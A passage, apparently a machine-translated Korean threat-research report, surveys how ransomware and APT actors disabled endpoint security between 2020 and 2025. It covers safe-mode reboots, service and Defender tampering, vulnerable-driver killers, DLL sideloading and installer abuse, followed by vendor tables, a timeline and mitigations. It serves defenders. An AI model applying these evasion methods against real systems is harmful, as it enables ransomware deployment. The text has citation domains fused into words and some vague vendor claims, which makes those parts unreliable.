재부팅하라는 명령과 함께 자신을 서비스로 설치하고 레지스트리 \u0026ldquo;실행\u0026rdquo; 키를 추가하여 프로세스(암호화기)가 bootnews.sophos.comnews.sophos.com의 안전 모드에서 시작되도록 하는 이 방법을 처음 대중화했습니다. 시스템이 최소한의 환경에서 다시 시작되면 Snatch는 안티맬웨어 서비스가 비활성화된 상태에서 파일 암호화를 시작하여 protectionnews.sophos.com을 우회했습니다. 이 기법은 이후에도 계속 나타났습니다. 예를 들어, 2023년에는 AvosLocker가 유사한 안전 모드 암호화 stepattackiq.com을 사용하는 것이 관찰되었습니다. 이를 통해 공격자는 에이전트가 시작되지 않기 때문에 에이전트 자체 방어를 무효화하고 안전 모드에서 보안 소프트웨어 파일을 변조하거나 제거할 수도 있습니다. 유일한 제약 조건은 공격자가 자동 재부팅 및 서비스를 구성할 수 있는 충분한 권한을 가지고 있어야 한다는 점이며, 공격의 후반 단계에 이르러 공격자가 이를 수행하는 경우가 많습니다.\nOS 도구(sc, net 등) 악용 - 공격자는 관리자 액세스 권한이 있으면 서비스 제어 관리자(sc.exe) 또는 net 중지 명령을 사용하여 보안 서비스를 중지하거나 Windows 레지스트리를 수정하여 서비스가 시작되지 않도록 하는 등 직접 변조를 시도할 수 있습니다. 대부분의 최신 EDR은 이러한 작업을 차단하기 위해 제거 암호를 요구하거나 서비스가 변조되는지 감지하는 등의 자체 보호 기능을 갖추고 있지만 이러한 보호 기능은 때때로 무력화될 수 있습니다. 일부 공격자는 PowerShell 스크립트 또는 WMI를 사용하여 레지스트리 키 또는 PowerShell Set-MpPreference cmdlet을 통해 Microsoft Defender의 실시간 모니터링을 해제하는 등 보안 기능을 비활성화하려고 시도합니다. 기업 환경에서는 Microsoft Defender의 변조 방지(활성화된 경우)가 이러한 설정을 잠그지만, 초기에는 모든 조직에서 이 기능을 기본으로 사용하도록 설정한 것은 아닙니다. 따라서 Defender 비활성화를 시도하는 단계가 포함된 멀웨어(및 코발트 스트라이크 플레이북)를 발견했습니다. 이러한 시도의 성공 여부는 다양하지만, 이러한 스크립트가 널리 퍼져 있다는 것은 공격자가 보호 기능이 꺼지거나 약화될 수 있는 잘못된 구성을 탐색한다는 것을 보여줍니다.\n에이전트 취약점 악용 - 때때로 보안 에이전트 자체에 공격자가 악용하여 비활성화할 수 있는 버그가 있는 경우가 있습니다. 2023년에 발생한 크라우드스트라이크 팔콘 사건이 대표적인 예입니다. 자세한 내용은 완전히 공개되지는 않았지만, 이 사건의 논리적 결함으로 인해 Falcon의 프로세스 파일-4pcvlwhk3myukez4vihgen이 중단될 수 있었다고 설명되었습니다. 이는 공격자가 특정 명령을 실행하거나 특정 방식으로 에이전트를 조작하면(권한을 획득한 후) Falcon 센서를 일시 중지하거나 충돌시킬 수 있음을 시사합니다. 크라우드스트라이크는 이 quickfile-4pcvlwhk3myukez4vihgen을 패치한 것으로 추정되지만, 최고 수준의 EDR 플랫폼에도 공격자가 공개할 경우 공격자가 포착할 수 있는 에지 케이스 취약점이 있을 수 있다는 점을 강조합니다. 또 다른 예로는 로컬 권한 상승을 허용하고 제품을 중단시키는 데 악용될 수 있는 2022년 트렌드마이크로 Apex One의 취약점이 있지만 위의 기법에 비해 흔한 사례는 아닙니다.\n생활 속 악용 - 공격자는 안전 모드 외에도 합법적인 관리 도구 또는 OS의 모드를 사용하여 보안을 회피합니다. 이러한 수법 중 하나는 \u0026lsquo;시스템 복구\u0026rsquo; 또는 복구 환경을 사용하는 것입니다. 예를 들어, 공격자는 컴퓨터를 Windows 복구 환경으로 부팅하거나 MSConfig와 같은 도구를 사용하여 최소 부팅을 설정한 다음 EDR이 로드되지 않을 때 파일을 암호화할 수 있습니다. 일부 랜섬웨어(예: 2022년 블랙 바스타)는 제어를 우회하기 위해 최소한의 상태로 부팅하는 전략을 사용한 것으로 알려졌습니다(안전 모드와 유사). 공격자들은 또한 HyperVisor 또는 가상 머신을 악용하기도 했습니다(2020년에는 호스트 기반 EDR을 회피하기 위해 호스트의 VirtualBox 가상 머신 내에서 랜섬웨어를 실행한 것으로 유명한 RagnarLocker가 있었습니다). 이는 다른 범주(가상화 기반 회피)에 속하지만, 시스템 기능을 악용하여 보안 소프트웨어를 우회하는 창의성을 보여줍니다.\n실제 영향 - 서비스 악용 기법은 재부팅, 서비스 중단 명령 등 노이즈가 발생하는 경향이 있지만, 성공하면 완전한 방어 우회로 이어집니다. 안전 모드가 사용된 사고에서 조직은 엔드포인트가 EDR 콘솔에서 오프라인 상태가 되었다가 다시 돌아왔지만 모든 데이터가 암호화된 상태에서 발견되는 등 사후에야 이를 알게 되는 경우가 많았습니다. Snatch 공격은 2019/2020년 말에 이에 대한 경고를 불러일으켰으며, 2023년까지 AvosLocker의 사용은 여전히 많은 벤더attackiq.com에 대해 효과적이라는 것을 재확인했습니다. 기본적으로 공격자가 보안 에이전트를 일시적 또는 영구적으로 종료할 수 있는 모든 시나리오는 해당 엔드포인트의 보호를 위한 게임 오버입니다. 이는 변조 방지 기능이 강력해야 한다는 것을 극명하게 보여줍니다. 관리자 수준의 멀웨어가 레지스트리 또는 서비스 제어를 통해 제품을 쉽게 비활성화할 수 있다면, 그 멀웨어는 정확히 그렇게 할 것입니다(많은 익스플로잇 후 키트가 이를 시도합니다). 이러한 \u0026lsquo;트릭\u0026rsquo;에 대한 공격자의 지식과 이를 방지하거나 탐지하기 위한 공급업체의 완화 기능 간의 군비 경쟁이 벌어지고 있습니다.\n완화 - 방어자는 서비스 악용 전략을 완화하기 위해 여러 단계를 수행할 수 있습니다. 예를 들어 레지스트리/서비스 변경을 차단하는 Microsoft Defender의 변조 방지 기능 또는 무단 언로드를 방지하는 다른 EDR의 유사한 기능 등 EDR/AV 변조 방지 기능을 사용하도록 설정하는 것이 중요합니다. 일부 EDR 제품은 \u0026lsquo;안전 모드에서 부팅하는 데 암호 필요\u0026rsquo; 또는 엔드포인트가 예기치 않게 안전 모드로 전환되는 경우 경고를 보내는 기능을 제공합니다. 가능한 경우 이러한 기능을 활성화해야 합니다. 또한 보안 서비스나 드라이버의 갑작스러운 중단을 모니터링하면 진행 중인 공격을 탐지할 수 있습니다. 대부분의 EDR 관리 콘솔은 에이전트가 통신을 중단하면 플래그를 표시합니다. IT 정책 관점에서 로컬 관리자 계정을 제한하고 자격 증명 계층화를 사용하면 공격자가 이러한 작업을 시도하기 어렵게 만들 수 있습니다. 궁극적으로 방어자는 예기치 않은 보안 에이전트 종료 또는 호스트가 안전 모드로 전환되는 것을 잠재적 침해의 징후로 간주하고 즉시 대응해야 합니다.\n다음 섹션에서는 이러한 회피 기법이 여러 공급업체에 어떻게 매핑되는지, 출현 시기, 이에 대응할 수 있는 완화 방법을 표 형식으로 비교 요약하여 설명합니다.\n기술 대 영향을 받는 공급업체(2020-2025년) 아래 표에는 각 우회 기법 범주가 영향을 받거나 표적이 된 보안 공급업체 또는 제품의 예와 함께 요약되어 있습니다. 이는 어떤 벤더도 완전히 자유로울 수 없으며, 특정 안전장치를 마련하지 않는 한 이러한 기법이 광범위하게 적용될 수 있음을 보여줍니다.\n회피 기술 영향을 받는 엔드포인트 보안 공급업체(예시) BYOI - 설치 프로그램 남용 SentinelOne: 에이전트 업그레이드 프로세스 악용(Babuk 랜섬웨어, 2025)halcyon.aihalcyon.ai. (\u0026ldquo;온라인 인증\u0026rdquo; 기능을 통해 SentinelOne이 수정 사항을 발표했습니다)halcyon.ai. 또한 잠재적으로: 로컬 설치 프로그램을 사용하는 다른 EDR(예: 연구자들은 Forcepoint 및 기타 EDR도 재설치를 통해 유사하게 우회할 수 있음을 보여주었습니다). 이는 재설치를 위해 인증을 요구하지 않는 모든 공급업체에 영향을 미칠 수 있는 설계 문제입니다. BYOVD - 취약한 드라이버 여러 공급업체: BYOVD 툴은 모든 주요 EDR/AV 벤더의 프로세스를 종료합니다(존재하는 경우). 예를 들어 Sophos, CrowdStrike, SentinelOne, Carbon Black, Microsoft Defender 등은 모두 드라이버 기반 EDR \u0026lsquo;킬러\u0026rsquo;의 표적이 되고 있습니다\u0026rdquo;halcyon.aihalcyon.ai. BlackByte (2022): MSI 애프터버너 드라이버(CVE-2019-16098)를 악용하여 EDR을 우회함(techtarget.com). 랜섬허브 EDR킬시프터 (2024): 취약한 드라이버를 사용하여 수십 개의 EDR/AV 프로세스를 죽입니다(SentinelOne, Microsoft, Trend Micro 등을 죽이는 것이 관찰됨)halcyon.aihalcyon.ai. LockBit/Medusa (2023): 프로세스 익스플로러 드라이버를 사용하여 EDR을 비활성화(피해자의 EDR이 무엇이든 영향을 받음, 다른 EDR로 보고된 사례)news.sophos.com. DLL 하이재킹/사이드 로딩 ESET: ESET의 명령줄 스캐너의 취약점으로 인해 DLL 하이재킹(토디캣 APT, 2024)이 허용됨 - 악성 DLL이 ESET 프로세스에 로드되어 itsecurelist.com을 비활성화합니다. ESET에서 패치 (CVE-2024-11859)securelist.com. Microsoft Defender: LockBit 랜섬웨어 계열사가 Defender의 MpCmdRun.exe를 악용하여 악성 DLL을 사이드 로드하여 Microsoft가 서명하는 processsentinelone.com에서 멀웨어 실행을 가능하게 합니다. 기타: 많은 벤더의 제품(및 기타 신뢰할 수 있는 소프트웨어)이 공격자(예: 다양한 APT 사례에서 업데이트 또는 보조 도구를 통해 TrendMicro, Kaspersky, Sophos)의 DLL 사이드 로딩에 사용되었습니다. 이 기술은 특정 공급업체에 국한된 것이 아니라 Windows가 DLL을 로드하고 서명된 바이너리를 신뢰하는 방식을 악용합니다. 서비스 남용 및 변조 CrowdStrike: 공격자가 서비스의 결함을 통해 센서를 일시 중단/비활성화할 수 있는 Falcon EDR 에이전트 취약점(2023년에 공개됨)이 발견되어 보호 파일-4pcvlwhk3myukez4vihgen을 약화시켰습니다. 발견 즉시 CrowdStrike에 의해 패치됨file-4pcvlwhk3myukez4vihgen. 모든 EDR(안전 모드): 특별히 다르게 설계되지 않은 한 모든 EDR은 안전 모드에서 작동하지 않습니다. Snatch(2020) 및 AvosLocker(2023)와 같은 랜섬웨어는 Sophos, Defender 등이 비활성 상태인 동안 안전 모드로 컴퓨터를 재부팅하여 파일을 암호화함으로써 이 점을 악용했습니다.sophos.comattackiq.com. 이는 일반 모드 드라이버에 의존하는 모든 공급업체에 영향을 미칩니다. Microsoft Defender: 공격자는 종종 PowerShell 또는 레지스트리 조정을 사용하여 (변조 방지 기능이 꺼져 있는 경우) Defender의 실시간 보호를 해제하려고 시도합니다. 변조 방지 기능이 없으면 로컬 관리자 멀웨어가 OS 설정을 통해 Defender를 비활성화할 수 있습니다(2020~2022년 많은 멀웨어 플레이북에서 볼 수 있음). 2019년 말부터 엔터프라이즈에서 기본으로 설정된 Microsoft의 Tamper Protection은 이러한 문제를 완화하지만 모든 조직에서 처음에 이 기능을 사용하도록 설정한 것은 아닙니다. Sophos EDR: 다른 멀웨어와 마찬가지로 멀웨어가 관리자 권한을 획득하면 Sophos 서비스를 언로드하거나 종료하려고 시도할 수 있습니다. Sophos는 강력한 자체 방어 기능을 갖추고 있지만 랜섬웨어 \u0026lsquo;킬 리스트\u0026rsquo;와 같은 사고가 발생하면 Sophos 프로세스가 종료될 수 있습니다. (알려진 공개 익스플로잇은 없지만, 예를 들어 LockBit의 내장 프로세스 킬러는 SophosSAVService.exe 등을 나열합니다.) 일반적으로 서비스 중단 시도는 모든 주요 공급업체를 공격하며, 성공 여부는 각 제품의 변조 방지 강도에 따라 달라집니다. 회피 기술 출현 타임라인 (2020-2025) 이 타임라인은 주요 우회 기법이나 캠페인이 처음 관찰된 시기와 2020년에서 2025년 사이에 어떻게 진화했는지를 보여줍니다:\n기간 회피 기술 및 주목할 만한 사건 세부 정보 및 영향 2019년 말~2020년 안전 모드 랜섬웨어(스내치) news.sophos.com 서비스 남용 Snatch 랜섬웨어는 Windows를 안전 모드로 재부팅하여 EDR/AV 없이 파일을 암호화합니다(runningnews.sophos.com). 2019년 10월 처음 발견, 2020년에도 지속. 대부분의 보안 도구가 안전 모드에서 로드되지 않아 멀웨어가 자유롭게 활동할 수 있는 설계상의 허점을 노렸습니다. Sophos는 이를 보호 기능을 우회하는 새로운 기법으로 보고하여 업계의 경각심을 불러일으켰습니다. 2021 오픈 소스 EDR 킬러(백스탭) news.sophos.com BYOVD 백스탭 도구가 출시(2021년 6월)되어 Process Explorer의 drivernews.sophos.com을 사용한 BYOVD 공격을 시연했습니다. 이는 공개적으로 사용 가능한 최초의 EDR 킬러 PoC 중 하나로, 이후 랜섬웨어의 채택을 예고했습니다. 공격자들은 드라이버 기반 킬을 실험하기 시작했지만, 2021년에는 주로 테스트/레드팀 맥락에서 볼 수 있었습니다. 2022 (Q3) 블랙바이트의 BYOVD 공격 techtarget.com BYOVD BlackByte 랜섬웨어 운영자는 침입 중에 서명된 취약한 드라이버(MSI 애프터버너의 RTCore64.sys)를 배포하여 EDRtechtarget.com을 비활성화합니다. (CVE-2019-16098 익스플로잇). 이 랜섬웨어는 최초의 주목할 만한 BYOVD 사례 중 하나이며(2022년 10월) Sophos와 미디어에 의해 공개되었습니다. 이 사례는 범죄 그룹이 EDR productstechtarget.com의 커널 인터페이스를 공격하기 위해 BYOVD를 채택했음을 보여주었습니다. 2022 (Q4) 랜섬웨어 EDR \u0026lsquo;킬러\u0026rsquo; 등장 news.sophos.com BYOVD 여러 랜섬웨어 그룹이 맞춤형 또는 탈취한 드라이버를 사용하여 EDR/AV 프로세스를 무력화하기 시작합니다. 2022년 말, Sophos, Microsoft, Mandiant 등은 악성 드라이버(일부는 인증서를 도용한)를 사용하여 보안을 우회하는 공격자들에 대해 보고했습니다(securitynews.sophos.com). 예를 들어, 블랙캣 사건에서 발견된 \u0026lsquo;POORTRY\u0026lsquo;라는 이름의 드라이버 등이 주목받았습니다. 이 파동으로 인해 공급업체는 Microsoft와 협력하여 인증서를 해지하고 차단 목록을 업데이트했습니다. 2022 (7월) LockBit 사이드 로드 디펜더 sentinelone.com DLL 사이드 로딩 LockBit 3.0 계열사가 Windows Defender의 MpCmdRun.exe를 사용하여 악성 DLL을 사이드로드하고 Cobalt Strike beaconsentinelone.com의 암호를 해독하는 것이 관찰되었습니다. (2022년 7월 보고된 사건). 보안 툴을 로더로 악용한 이 혁신적인 사례는 위협 공격자들이 보안 프로세스 내에서 우회로를 모색하고 있다는 신호였습니다. EDR을 직접 비활성화하지는 않았지만 신뢰할 수 있는 바이너리를 사용하여 탐지를 회피했습니다. 2023년(1월~2월) 랜섬웨어 공격으로 인한 AuKill news.sophos.com BYOVD 2023년 초에 EDR을 비활성화한 후 메두사 락커와 락빗 랜섬웨어를 배포하는 등 최소 3건의 사례에서 AuKill 멀웨어(오래된 프로세스 탐색기 드라이버를 사용하는 BYOVD 도구)가 사용되었습니다. 이는 EDR 킬러의 상품화, 즉 서로 다른 RaaS 프랜차이즈의 계열사들이 동일한 툴을 확보하고 있음을 보여줍니다. Sophos는 2023년 4월에 드라이버 기반 공격의 증가를 강조하는 세부 정보를 발표했습니다..sophos.comnews. 2023년(중반) 크라우드스트라이크 팔콘 취약점 파일 -4pcvlwhk3myukez4vihgen 서비스 결함 관리자 액세스 권한을 가진 공격자가 CrowdStrike Falcon의 취약점**(2023년 중반 공개)을 통해 Falcon 센서 프로세스 파일-4pcvlwhk3myukez4vihgen을 일시 중단하거나 중단시킬** 수 있었습니다. 자세한 내용은 알려지지 않았지만(의도된 설계라기보다는 버그일 가능성이 높음), 주요 EDR조차도 자체 보호를 유지하기 위해 로직 결함을 패치해야 한다는 점을 강조했습니다. 크라우드스트라이크는 수정 사항을 발표했지만 멀웨어에 의한 광범위한 악용 사례는 공개적으로 보고되지 않았지만 POC가 존재했을 수 있습니다. 2023년(후기) 안전 모드 리덕스(AvosLocker) 공격아이큐닷컴 서비스 남용 2023년 FBI/CISA의 권고에 따르면 안전 모드 트릭을 사용하여 securityattackiq.com을 비활성화하는 AvosLocker 랜섬웨어에 대해 언급했습니다. 이를 통해 새로운 랜섬웨어 변종들이 Snatch가 개척한 전술을 채택하고 있음을 확인할 수 있었습니다. 지금까지 여러 랜섬웨어 계열(Snatch, BlackBasta, AvosLocker)이 재부팅을 통해 EDR을 우회하는 변종을 사용했으며, 이는 여전히 실행 가능한 우회 방법임을 나타냅니다. 2024년(중반) 랜섬허브의 EDR킬시프터 출시 halcyon.ai BYOVD 랜섬허브 조직은 2024년 5월경에 맞춤형 EDR 킬러인 EDRKillShifter를 출시했습니다(welivesecurity.comwelivesecurity.com). 2024년 내내 이 툴은 공격이 급증했고, 2024년 8월에는 랜섬허브 오퍼레이션할시온.ai와 확고하게 연관되었습니다. 몇 주 만에 계열사들은 다른 랜섬웨어(Play, BianLian 등)에서 이 툴을 사용하기 시작했으며, 이는 교차 수분halcyon.ai를 나타냅니다. 이 시기는 랜섬웨어 캠페인에서 BYOVD 툴 사용이 정점을 찍는 시기로, playresearch.checkpoint.com에 수천 개의 드라이버 변종이 등장했습니다. 2024년(후기) 토디캣 ESET DLL 하이재킹 보안리스트.com DLL 하이재킹 2024년 말, 카스퍼스카이는 ESET 소프트웨어에서 DLL 하이재킹을 사용하여 보호 기능을 은밀하게 비활성화하는 ToddyCat APT를 발견했습니다.securelist.com. ESET의 패치와 권고는 2025년 1월에 발표되었습니다.securelist.com. 이는 취약점을 통해 보안 공급업체를 직접 공격하는 APT 스타일의 우회 공격이 발생한 드문 사례였습니다. 이 사건은 공급업체가 로딩 메커니즘을 감사해야 할 필요성을 강조했습니다. 2025 (Q1) 센티넬원 BYOI (바북) bleepingcomputer.comhalcyon.ai BYOI \u0026ldquo;자체 설치 프로그램 가져 오기\u0026rdquo; 기법은 2025년 초에 바부크 랜섬웨어 공격자들이 설치 프로그램halcyon.ai를 악용하여 SentinelOne EDR을 우회하면서 공개적으로 공개되었습니다. Aon/Stroz Friedberg의 보고서(2025년 1월)와 후속 보도(2025년 5월)에서는 공격자가 업그레이드 프로세스를 악용하여 에이전트를 삭제한 다음 systembleepingcomputer.comhalcyon.ai를 암호화하는 방법을 자세히 설명했습니다. 센티넬원의 대응과 2025년 BYOI에 대한 업계의 논의는 엔드포인트 회피 전술의 최신 진화를 보여줍니다. 완화 접근 방식 및 방어 조치 마지막으로 각 우회 카테고리와 관련된 방어 전략을 비교합니다. 이러한 접근 방식은 공급업체 측의 수정 사항, 구성 강화, 방어자가 사용해야 하는 탐지 기술을 결합합니다:\n회피 기술 완화 전략 인스톨러 어뷰징(BYOI) EDR 업그레이드/제거를 강화합니다: 에이전트 제거 또는 업그레이드에 대한 중앙 집중식 인증을 제공하는 솔루션을 사용합니다(예: SentinelOne의 \u0026ldquo;온라인 인증\u0026rdquo; 토글)halcyon.aibleepingcomputer.com). 승인 없이는 로컬 재설치 시도를 진행할 수 없도록 이 기능을 사용하도록 설정하세요. 변조 방지 제어를 유지하세요: EDR의 자체 보호/변조 방지 기능이 완전히 활성화되고 업데이트되었는지 확인합니다. 공급업체는 업그레이드 프로세스의 결함을 신속하게 패치해야 합니다. 또한 관리자는 엔드포인트 파일-uzvb8akgpxzutg7wga8ks6에서 예기치 않은 설치 프로그램 실행 또는 여러 버전의 설치 프로그램 파일을 모니터링할 수 있습니다(Babuk 사례에서 볼 수 있음). 취약한 드라이버(BYOVD) 드라이버 차단 목록: Microsoft의 기본 제공 취약 드라이버 차단 목록(Windows Defender 응용 프로그램 제어 또는 코어 격리 설정을 통해 사용 가능)을 활성화하여 알려진 악성 드라이버가research.checkpoint.comresearch.checkpoint.com을 로드하지 못하도록 합니다. 이 목록을 최신 상태로 유지하세요(Microsoft는 새로운 위협에 대해 주기적으로 업데이트합니다). EDR 커널 모드 모니터링: 악성 드라이버 동작을 탐지하거나 차단할 수 있는 EDR 솔루션을 사용하세요. 예를 들어, ESET과 같은 EDR은 비정상적인 위치 또는 알려진 취약한 드라이버 파일(4pcvlwhk3myukez4vihgen)에서 드라이버가 로드되는 것을 플래그 지정합니다. 이렇게 하면 서명되지 않은 새로운 드라이버가 도입되는 공격을 차단할 수 있습니다. 최소 권한 및 디바이스 제어: 공격자가 드라이버를 설치하기 어렵도록 엔드포인트에 대한 관리 권한을 제한하세요. 그룹 정책 또는 디바이스 제어 소프트웨어를 사용하여 승인되지 않은 드라이버 설치를 아예 방지하는 것도 고려하세요. OS 및 드라이버의 신속한 패치 적용: 시스템의 합법적인 드라이버가 패치된 버전으로 업데이트되었는지 확인하세요. 많은 BYOVD 공격은 디스크에 남아 있을 수 있는 드라이버(예: 오래된 치트 방지 또는 오버클러킹 도구)를 대상으로 합니다. 이러한 드라이버를 제거하거나 업데이트하여 취약한 버전을 제거하세요. DLL 하이재킹/사이드 로딩 공급업체 패치를 적용하세요: 엔드포인트 보안 소프트웨어를 최신 상태로 유지하세요. ESET과 같은 공급업체는 DLL 로드 취약점(예: CVE-2024-11859)에 대한 패치를 발표했으며, 이를 적용하면 알려진 하이재킹 기회에 대한 문을 닫을 수 있습니다 보안 목록. 보안 구성: 가능하면 EDR 프로세스에 대해 PPL(보호된 프로세스 표시등)과 같은 옵션을 사용하도록 설정하세요(현재 많은 AV/EDR이 기본적으로 PPL로 실행되므로 서명되지 않은 코드 삽입을 방지할 수 있습니다). 또한 의심스러운 동작을 차단하는 Windows Defender의 ASR 규칙(Office 앱이나 다른 앱이 하위 프로세스를 만들지 못하도록 하는 규칙이 있어 일부 사이드 로드 시나리오를 완화할 수 있음)을 고려하세요. 모니터링 및 헌팅: 비정상적인 DLL 로드를 감시하세요. 예를 들어, 정상적인 프로세스가 Temp 디렉터리 또는 사용자 프로필 경로에서 DLL을 로드하는 경우 이는 위험 신호입니다. EDR 텔레메트리를 사용하여 알려진 롤빈(예: rundll32.exe, regsvr32.exe 또는 MpCmdRun.exe)이 비정상적인 modulessentinelone.comsentinelone.com을 로드하는지 탐지하세요. 이러한 조건에 대한 알림 규칙을 만들면 사이드 로딩 시도를 조기에 포착할 수 있습니다. 서비스 남용 및 변조 변조 방지 기능을 활성화합니다: 이것은 매우 중요합니다. 예를 들어 레지스트리/서비스 변경을 차단하려면 Microsoft Defender의 변조 방지 기능을 사용하도록 설정하고 다른 EDR의 유사한 기능도 사용하도록 설정하세요. 이렇게 하면 맬웨어에 의한 쉬운 서비스 종료 또는 설정 조정을 방지할 수 있습니다. 보안 부팅/안전 모드 보호: EDR에서 안전 모드 또는 BIOS에서 보호하는 기능을 제공하는 경우(일부만 제공) 이를 사용하세요. 공격자가 대체 모드로 부팅하거나 자격 증명 없이 부트로더를 사용하는 것을 방지할 수 있도록 최소한 BIOS/펌웨어 암호를 설정하고 TPM으로 BitLocker를 활성화하세요. (공격자가 이미 디바이스를 온 상태로 관리하고 있다면 완벽하지는 않지만, 다른 모드로 콜드 재부팅하는 데 장애물이 추가됩니다.) 계정 및 권한 제어: 서비스 계정에는 최소 권한을 사용하세요. 도메인 관리자나 IT 관리자는 일상적인 업무에 별도의 계정을 사용해야 공격자가 높은 권한의 계정을 사용하여 보안을 쉽게 무력화하지 못하도록 방지할 수 있습니다. 이상 징후 탐지: 보안 서비스가 중지되거나 예기치 않게 비활성화 상태가 되는 경우에 대한 알림을 구성하세요. EDR 관리 콘솔은 종종 에이전트 상태를 표시합니다. 에이전트가 오프라인 상태가 되거나 유지 관리 기간 외의 호스트에서 제거되는 경우 이를 SIEM과 통합하여 알림을 보내세요. 또한 시스템이 안전 모드로 재부팅되는지 모니터링하세요(이벤트 로그를 통해 OS가 안전 모드에서 시작되었는지 확인할 수 있음). 이러한 이벤트를 스니핑하면 랜섬웨어 배포가 완료되기 전에 대응자가 대응할 수 있는 기회를 제공합니다. 인시던트 대응 계획: \u0026lsquo;EDR 비활성화\u0026rsquo; 시나리오에 대한 IR 계획을 개발하세요. 예를 들어, 엔드포인트가 체크인을 중단하는 경우 네트워크 수준에서 해당 호스트를 격리하는 플레이북을 준비하세요. 에이전트 손실은 공격이 진행 중임을 의미할 수 있다고 가정하고, 한 노드가 일시적으로 차단되더라도 신속하게 격리하면 피해를 제한할 수 있습니다. EDR 회피를 위한 방어 권장 사항 이러한 위협을 고려할 때 보안팀은 다계층 방어 전략을 채택해야 합니다. 다음은 이러한 우회 기법에 대한 엔드포인트 방어를 강화하기 위한 전략적 권장 사항입니다:\n변조 방지 기능을 활성화하고 시행합니다: 모든 엔드포인트 보안 도구에서 변조 방지 기능을 사용 설정합니다(예: 모든 에이전트 제거, 중지 또는 업그레이드에 관리자 콘솔 인증 또는 암호 필요)bleepingcomputer.com). Microsoft Defender의 변조 방지와 같은 기능이 전사적으로 사용하도록 설정되어 있는지 확인합니다. 이러한 조치는 맬웨어가 표준 OS 인터페이스를 통해 보호를 차단할 수 없도록 합니다.\n드라이버 로드 제어를 채택합니다: Microsoft의 드라이버 차단 목록을 구현하고(가능한 경우 하이퍼바이저 보호 코드 무결성을 활성화) 알려진 취약한 드라이버가 실행되는 것을 차단합니다. 명시적으로 허용되지 않는 커널 드라이버를 차단하는 EDR 솔루션 또는 OS 제어 기능을 사용하는 것을 고려하세요. 새로운 BYOVD 위협이 등장하면 이러한 제어 기능을 정기적으로 업데이트하세요.\n엔드포인트 에이전트 구성 강화: EDR에서 제공하는 가장 안전한 설정을 사용하세요. 예를 들어, 에이전트 업데이트에 대해 \u0026ldquo;온라인/클라우드 인증\u0026quot;을 사용하도록 설정하고(SentinelOne에서와 같이) 로컬 관리자 재정의 기능을 비활성화하고 에이전트가 최고 보호 모드로 실행되도록 합니다(중요 시스템에 대한 강화 모드가 있는 경우가 많음). 오용될 수 있는 안전 부팅 또는 복구 옵션을 제거하거나 암호로 보호하세요.\n최신 패치 유지(EDR 및 OS): 엔드포인트 보안 소프트웨어를 최신 버전으로 최신 상태로 유지하세요. 공급업체는 종종 취약점(예: ESET DLL 하이재킹 수정)을 해결하기 위해 조용한 업데이트를 릴리스합니다(securelist.com). 신속하게 적용하세요. 마찬가지로 OS 구성 요소도 업데이트하세요. 예를 들어 드라이버 차단 또는 안전 모드 보호 기능을 개선하는 Windows 업데이트를 적용하세요. 적시에 패치를 적용하면 공격자가 이를 악용하기 전에 알려진 허점을 차단할 수 있습니다.\n관리자 권한을 제한합니다: 최소 권한 원칙을 적용하세요. 사용자는 기본적으로 워크스테이션에 대한 로컬 관리자 권한이 없어야 합니다. 관리자 계정은 엄격하게 제어해야 합니다(권한 있는 액세스 관리 사용). 관리자 수준의 액세스 가용성을 줄이면 공격자가 드라이버 설치 또는 서비스 조작과 같은 작업을 수행할 수 있는 능력이 줄어듭니다. 멀웨어가 실행되더라도 EDR을 비활성화할 수 있는 권한이 부족할 수 있습니다.\n회피 지표 모니터링: 탐지 엔지니어링을 강화하여 EDR 회피 징후를 포착하세요. 특히 보안 프로세스(드라이버 공격을 나타낼 수 있음)가 포함된 경우 대량 프로세스 종료 이벤트에 대한 알림을 설정합니다(asec.ahnlab.com). 보안 도구 또는 유틸리티의 비정상적인 하위 프로세스(예: 알 수 없는 프로세스를 생성하는 Defender의 CLI)를 모니터링합니다. 정상적인 업데이트의 일부가 아닌 엔드포인트에 드라이버가 설치되는 경우 이를 기록하고 경고합니다. 또한 EDR 에이전트가 오프라인 상태가 되거나 \u0026ldquo;비활성화\u0026rdquo; 상태가 되면 잠재적인 인시던트로 간주하고 즉시 조사하세요.\n복원력 및 대응력 향상: 100% 완벽한 예방책은 없으므로 복원력에 집중하세요. 예를 들어, 에이전트가 변조 이벤트를 보고하거나 예기치 않게 중단되는 경우 SOC가 네트워크 제어를 통해 해당 호스트를 격리할 수 있도록 엔드포인트 격리 기능을 확보하세요. 엔드포인트 백업/복원 솔루션에 투자하여 한 계층(EDR)을 우회하더라도 중요한 시스템을 신속하게 복구할 수 있도록 하세요. EDR 우회 시나리오에 대해 IR 계획을 정기적으로 테스트하고 \u0026ldquo;엔드포인트 에이전트가 무력화되었으니 이제 어떻게 할 것인가?\u0026ldquo;라는 가정 하에 훈련을 실시하세요.\n행동 분석 및 이상 징후 탐지: 행동 분석을 사용하는 EDR/MDR 솔루션을 활용하여 회피의 결과를 파악하세요. 예를 들어, 안전 모드에 있는 공격자는 여전히 컴퓨터를 재부팅해야 하는데, 사용자 행동 분석 기능이 있는 EDR은 이상한 타이밍에 재부팅하거나 bcdedit 명령을 사용하는 것을 포착할 수 있습니다. 마찬가지로 비정상적인 도구 사용(예: 비정상적인 상황에서 실행되는 관리자 도구)도 탐지할 수 있습니다. EDR의 머신 러닝은 초기 회피로 인해 일부 원격 분석이 가려지더라도 이러한 이상 징후를 포착할 수 있습니다.\n결론적으로 엔드포인트 보안 우회 기법은 2020년부터 2025년까지 더욱 정교해질 것이지만, 우수한 제품 구성, 최신 위협 인텔리전스, 철저한 모니터링을 결합하면 그 영향을 크게 완화할 수 있습니다. 보안 엔지니어는 EDR 공급업체와 긴밀히 협력하여 사용 가능한 안전 장치(예: 드라이버 차단 목록, 변조 방지 설정)를 배포하고 엔드포인트가 이러한 \u0026lsquo;생활형\u0026rsquo; 공격의 쉬운 표적이 되지 않도록 해야 합니다. 궁극적으로는 인식과 대비가 핵심입니다. 공격자가 도구를 역이용할 수 있고 시도할 수 있다는 사실을 아는 것이halcyon.ai를 성공시키지 않기 위한 첫 번째 단계입니다.\n출처: SentinelOne, Sophos, Microsoft, ESET, 카스퍼스키, A온 스트로즈 프리드버그 사례 연구 및 위협 연구halcyon.aihalcyon.aisecurelist.comnews.sophos.com, 2020-2025년 CISA 경보 및 업계 보고서 이러한 우회 기법을 자세히 설명하는 attackiq.comtechtarget.com. 이러한 참고 자료는 최근 몇 년 동안 이러한 전술이 널리 퍼져 있으며 강력한 다계층 방어 전략의 중요성을 강조합니다.\n참고 링크 - EDR 회피 연구(2020-2025) Halcyon. (2024년 1월 10일). 랜섬웨어 공격은 BYOI 기법으로 EDR을 우회합니다. Halcyon. 